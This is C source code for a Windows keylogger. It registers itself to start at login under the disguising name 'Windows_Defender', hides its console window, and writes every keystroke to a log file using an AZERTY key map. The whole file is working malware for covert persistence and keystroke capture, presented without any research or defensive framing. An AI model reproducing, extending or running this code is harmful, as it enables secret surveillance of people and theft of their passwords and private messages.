
void autorun()
{
	char my_file[256];
	GetModuleFileName(NULL,my_file,256);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
	RegSetValueEx(newValue,"Windows_Defender",0,REG_SZ,(LPBYTE)my_file,sizeof(my_file));
	RegCloseKey(newValue);
}

void hidden()
{
  HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );
}

void wkey(int k,FILE *f,int mj,int alt,int *caps, int *limit)

{
	switch (k)
	{
		case 0x11:
			fputs("[CTRL]",f);
			*limit=*limit+6;
			break;

		case 91:
			fputs("[WIN]",f);
			*limit=*limit+5;
			break;

		case 92:
			fputs("[WIN]",f);
			*limit=*limit+5;
			break;

		case 0x09:
			fputs("[TAB]",f);
			*limit=*limit+5;
			break;

		case 0x0D:
			fputs("[ENTER]",f);
			*limit=*limit+7;
			break;

		case 0x08:
			fputs("[BCKSP]",f);
			*limit=*limit+7;
			break;

		case 0x20:
			fputs("[SP]",f);
			*limit=*limit+4;
			break;

		case 0x2E:
			fputs("[DEL]",f);
			*limit=*limit+5;
			break;

		case 0x30:
			if (mj || *caps) {fputs("0",f);}
			else if (alt) {fputs("@",f);}
			else{fputs("à",f);}
			*limit=*limit+1;
			break;

		case 0x31:
			if (mj || *caps) {fputs("1",f);}
			else{fputs("&",f);}
			*limit=*limit+1;
			break;

		case 0x32:
			if (mj || *caps) {fputs("2",f);}
			else if (alt) {fputs("~",f);}
			else{fputs("é",f);}
			*limit=*limit+1;
			break;

		case 0x33:
			if (mj || *caps) {fputs("3",f);}
			else if (alt) {fputs("#",f);}
			else{fputs("\"",f);}
			*limit=*limit+1;
			break;

		case 0x34:
			if (mj || *caps) {fputs("4",f);}
			else if (alt) {fputs("{",f);}
			else{fputs("\'",f);}
			*limit=*limit+1;
			break;

		case 0x35:
			if (mj || *caps) {fputs("5",f);}
			else if (alt) {fputs("[",f);}
			else{fputs("(",f);}
			*limit=*limit+1;
			break;

		case 0x36:
			if (mj || *caps) {fputs("6",f);}
			else if (alt) {fputs("|",f);}
			else{fputs("-",f);}
			*limit=*limit+1;
			break;
		case 0x37:
			if (mj || *caps) {fputs("7",f);}
			else if (alt) {fputs("`",f);}
			else{fputs("è",f);}
			*limit=*limit+1;
			break;
		case 0x38:
			if (mj || *caps) {fputs("8",f);}
			else if (alt) {fputs("\\",f);}
			else{fputs("_",f);}
			*limit=*limit+1;
			break;
		case 0x39:
			if (mj || *caps) {fputs("9",f);}
			else if (alt) {fputs("^",f);}
			else{fputs("ç",f);}
			*limit=*limit+1;
			break;
		case 0x41:
			if (mj || *caps) {fputs("A",f);}
			else{fputs("a",f);}
			*limit=*limit+1;
			break;
		case 0x42:
			if (mj || *caps) {fputs("B",f);}
			else{fputs("b",f);}
			*limit=*limit+1;
			break;
		case 0x43:
			if (mj || *caps) {fputs("C",f);}
			else{fputs("c",f);}
			*limit=*limit+1;
			break;
		case 0x44:
			if (mj || *caps) {fputs("D",f);}
			else{fputs("d",f);}
			*limit=*limit+1;
			break;
		case 0x45:
			if (mj || *caps) {fputs("E",f);}
			else if (alt) {fputs("€",f);}
			else{fputs("e",f);}
			*limit=*limit+1;
			break;
		case 0x46:
			if (mj || *caps) {fputs("F",f);}
			else{fputs("f",f);}
			*limit=*limit+1;
			break;
		case 0x47:
			if (mj || *caps) {fputs("G",f);}
			else{fputs("g",f);}
			*limit=*limit+1;
			break;
		case 0x48:
			if (mj || *caps) {fputs("H",f);}
			else{fputs("h",f);}
			*limit=*limit+1;
			break;
		case 0x49:
			if (mj || *caps) {fputs("I",f);}
			else{fputs("i",f);}
			*limit=*limit+1;
			break;
		case 0x4A:
			if (mj || *caps) {fputs("J",f);}
			else{fputs("j",f);}
			*limit=*limit+1;
			break;
		case 0x4B:
			if (mj || *caps) {fputs("K",f);}
			else{fputs("k",f);}
			*limit=*limit+1;
			break;
		case 0x4C:
			if (mj || *caps) {fputs("L",f);}
			else{fputs("l",f);}
			*limit=*limit+1;
			break;
		case 0x4D:
			if (mj || *caps) {fputs("M",f);}
			else{fputs("m",f);}
			*limit=*limit+1;
			break;
		case 0x4E:
			if (mj || *caps) {fputs("N",f);}
			else{fputs("n",f);}
			*limit=*limit+1;
			break;
		case 0x4F:
			if (mj || *caps) {fputs("O",f);}
			else{fputs("o",f);}
			*limit=*limit+1;
		break;
		case 0x50:
			if (mj || *caps) {fputs("P",f);}
			else{fputs("p",f);}
			*limit=*limit+1;
		break;
		case 0x51:
			if (mj || *caps) {fputs("Q",f);}
			else{fputs("q",f);}
			*limit=*limit+1;
		break;
		case 0x52:
			if (mj || *caps) {fputs("R",f);}
			else{fputs("r",f);}
			*limit=*limit+1;
		break;
		case 0x53:
			if (mj || *caps) {fputs("S",f);}
			else{fputs("s",f);}
			*limit=*limit+1;
		break;
		case 0x54:
			if (mj || *caps) {fputs("T",f);}
			else{fputs("t",f);}
			*limit=*limit+1;
		break;
		case 0x55:
			if (mj || *caps) {fputs("U",f);}
			else{fputs("u",f);}
			*limit=*limit+1;
		break;
		case 0x56:
			if (mj || *caps) {fputs("V",f);}
			else{fputs("v",f);}
			*limit=*limit+1;
		break;
		case 0x57:
			if (mj || *caps) {fputs("W",f);}
			else{fputs("w",f);}
			*limit=*limit+1;
		break;
		case 0x58:
			if (mj || *caps) {fputs("X",f);}
			else{fputs("x",f);}
			*limit=*limit+1;
		break;
		case 0x59:
			if (mj || *caps) {fputs("Y",f);}
			else{fputs("y",f);}
			*limit=*limit+1;
		break;
		case 0x5A:
			if (mj || *caps) {fputs("Z",f);}
			else{fputs("z",f);}
			*limit=*limit+1;
		break;

		case 0x60:
			fputs("0",f);
			*limit=*limit+1;
			break;
		case 0x61:
			fputs("1",f);
			*limit=*limit+1;
			break;
		case 0x62:
			fputs("2",f);
			*limit=*limit+1;
			break;
		case 0x63:
			fputs("3",f);
			*limit=*limit+1;
			break;
		case 0x64:
			fputs("4",f);
			*limit=*limit+1;
			break;
		case 0x65:
			fputs("5",f);
			*limit=*limit+1;
			break;
		case 0x66:
			fputs("6",f);
			*limit=*limit+1;
			break;
		case 0x67:
			fputs("7",f);
			*limit=*limit+1;
			break;
		case 0x68:
			fputs("8",f);
			*limit=*limit+1;
			break;
		case 0x69:
			fputs("9",f);
			*limit=*limit+1;
			break;
		case 0x6A:
			fputs("*",f);
			*limit=*limit+1;
			break;
		case 0x6B:
			fputs("+",f);
			*limit=*limit+1;
			break;
	//	case 0x6C:
	//		fputs("/",f);
	//		break;

		case 0x6D:
			fputs("-",f);
			*limit=*limit+1;
			break;
		case 0x6E:
			fputs(".",f);
			*limit=*limit+1;
			break;
		case 0x6F:
			fputs("/",f);
			*limit=*limit+1;
			break;

		case 187:
			if (mj || *caps) {fputs("+",f);}
			else if (alt) {fputs("}",f);}
			else {fputs("=",f);}
			*limit=*limit+1;
			break;

		case 186:
			if (mj || *caps) {fputs("£",f);}
			else{fputs("$",f);}
			*limit=*limit+1;
			break;

		case 188:
			if (mj || *caps) {fputs("?",f);}
			else{fputs(",",f);}
			*limit=*limit+1;
			break;

		case 190:
			if (mj || *caps) {fputs(".",f);}
			else{fputs(";",f);}
			*limit=*limit+1;
			break;

		case 191:
			if (mj || *caps) {fputs("/",f);}
			else{fputs(":",f);}
			*limit=*limit+1;
			break;

		case 192:
			if (mj || *caps) {fputs("%",f);}
			else{fputs("ù",f);}
			*limit=*limit+1;
			break;

		case 219:
			if (mj || *caps) {fputs("°",f);}
			else if (alt) {fputs("]",f);}
			else{fputs(")",f);}
			*limit=*limit+1;
			break;

		case 220:
			if (mj || *caps) {fputs("µ",f);}
			else{fputs("*",f);}
			*limit=*limit+1;
			break;

		case 221:
			if (mj || *caps) {fputs("¨",f);}
			else{fputs("^",f);}
			*limit=*limit+1;
			break;

		case 222:
			fputs("²",f);
			*limit=*limit+1;
			break;
		case 223:
			if (mj || *caps) {fputs("§",f);}
			else if (alt) {fputs("¤",f);}
			else{fputs("!",f);}
			*limit=*limit+1;
			break;

		case 226:
			if (mj || *caps) {fputs(">",f);}
			else{fputs("<",f);}
			*limit=*limit+1;
			break;

      	}

      }
